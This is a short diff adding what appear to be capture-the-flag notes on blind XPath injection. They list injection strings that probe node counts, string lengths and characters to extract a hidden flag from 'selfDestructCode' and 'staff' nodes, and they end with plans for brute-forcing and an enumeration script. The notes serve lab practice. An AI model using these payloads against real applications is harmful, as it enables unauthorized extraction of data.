@@ -1,0 +1,33 @@
+- Blind Xpath injection
+
+verify xpath:
+	' or '1'='1' or 'a'='a
+
+count staff nodes 
+	' or count(//staff)=16 or '2'='1
+
+look for selfDestructCode
+	' or count(//selfDestructCode)=2 or '2'='1
+
+get length of selfDestructCode nodes
+	' or string-length(//selfDestructCode[position()=1])=21 or '2'='1
+	' or string-length(//selfDestructCode[position()=2])=0 or '2'='1
+
+get characters of flag
+	' or substring((//selfDestructCode[position()=1]),1,x)='y' or '2'='1
+
+- brute force up to length 21
+
+- this isn't the whole flag though
+
+- count number of child nodes for each staff node
+
+	count(//staff[position()=x]/child::node())=y or '2'='1
+
+- check if child nodes of staff node 1 has content
+
+	string-length(//staff[position()=1]/child::node()[poisition()=x])=0 or '2'='1
+
+- write script to enumerate contents of all staff nodes
+
+
